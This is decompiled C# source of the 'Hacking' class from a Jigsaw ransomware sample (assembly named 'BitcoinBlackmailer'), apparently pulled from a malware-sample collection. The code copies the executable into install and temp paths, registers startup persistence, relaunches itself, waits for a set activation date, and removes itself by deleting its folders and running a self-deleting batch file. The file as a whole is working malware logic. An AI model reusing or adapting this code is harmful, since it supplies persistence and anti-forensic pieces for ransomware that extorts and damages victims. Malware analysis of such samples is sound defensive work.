// Decompiled with JetBrains decompiler
// Type: Main.Tools.Hacking
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 1950B17F-8BE4-40AB-B698-96070A0C2297
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Win.Ransomware.Jigsaw-6866216-0-31a9ca0a1f20618bf113dd2b03a0cb28fc003a800e49c74b97e9baca5acc26e2.exe

using Main.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Main.Tools
{
  internal static class Hacking
  {
    internal static void InitSoftware(Config.StartModeType startMode, string arg)
    {
      if (startMode == Config.StartModeType.Debug)
      {
        int num1 = (int) MessageBox.Show(Resources.StartModeDebug);
      }
      else if (arg != null)
      {
        if (startMode == Config.StartModeType.DeleteItself)
        {
          arg = arg.Replace("?", " ");
          if (Path.IsPathRooted(arg) && File.Exists(arg))
          {
            int num2 = 0;
            bool flag;
            do
            {
              string withoutExtension = Path.GetFileNameWithoutExtension(arg);
              string exeFolderPath = Directory.GetParent(arg).ToString();
              flag = ((IEnumerable<Process>) Process.GetProcessesByName(withoutExtension)).FirstOrDefault<Process>((Func<Process, bool>) (p => p.MainModule.FileName.StartsWith(exeFolderPath))) != null;
              Thread.Sleep(100);
              ++num2;
            }
            while (flag && num2 < 100);
            Thread.Sleep(300);
            if (!flag)
              File.Delete(arg);
          }
        }
        if (startMode == Config.StartModeType.ErrorMessage)
        {
          int num3 = (int) MessageBox.Show(Config.ErrorMessage, Config.ErrorTitle, MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        if (!Config.OnlyRunAfterSysRestart)
          return;
        Environment.Exit(0);
      }
      else
      {
        string tempExePath = Config.TempExePath;
        if (Config.FinalExeRelativePath != null)
        {
          string str = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileName(Config.FinalExeRelativePath));
          Main.Tools.Windows.SetStartup(Config.StartupMethod);
          if (Application.ExecutablePath == Config.FinalExePath || Application.ExecutablePath == str)
            return;
        }
        if (Hacking.ExeSmartCopy(Config.FinalExePath, true))
          Hacking.ExeSmartCopy(tempExePath, true);
        string arguments = Application.ExecutablePath.Replace(" ", "?");
        Process.Start(tempExePath, arguments);
        Environment.Exit(0);
      }
    }

    internal static bool ExeSmartCopy(string targetExePath, bool overwrite)
    {
      if (Application.ExecutablePath == targetExePath)
        return false;
      Directory.CreateDirectory(Directory.GetParent(targetExePath).ToString());
      File.Copy(Application.ExecutablePath, targetExePath, overwrite);
      return true;
    }

    internal static bool ShouldActivate() => DateTime.Now > Config.ActiveAfterDateTime;

    internal static void RemoveItself()
    {
      if (Config.StartMode == Config.StartModeType.Debug)
        Environment.Exit(0);
      try
      {
        Main.Tools.Windows.RemoveStartupRegistry(Config.FinalExePath);
        foreach (string path in new HashSet<string>()
        {
          Path.GetDirectoryName(Config.FinalExePath),
          Path.GetDirectoryName(Config.TempExePath),
          Config.WorkFolderPath
        })
        {
          try
          {
            if (Directory.Exists(path))
              Directory.Delete(path, true);
          }
          catch (Exception ex)
          {
          }
        }
        string str = Path.GetDirectoryName(Application.ExecutablePath) + "\\DeleteItself.bat";
        using (StreamWriter streamWriter = new StreamWriter(str, false, Encoding.Default))
          streamWriter.Write(":del\r\n del \"{0}\"\r\nif exist \"{0}\" goto del\r\ndel %0\r\n", (object) Application.ExecutablePath);
        int num = (int) Hacking.WinExec(str, 0U);
      }
      catch
      {
      }
      finally
      {
        try
        {
          Environment.Exit(0);
        }
        catch
        {
          Application.Exit();
        }
      }
    }

    [DllImport("kernel32.dll")]
    public static extern uint WinExec(string lpCmdLine, uint uCmdShow);
  }
}
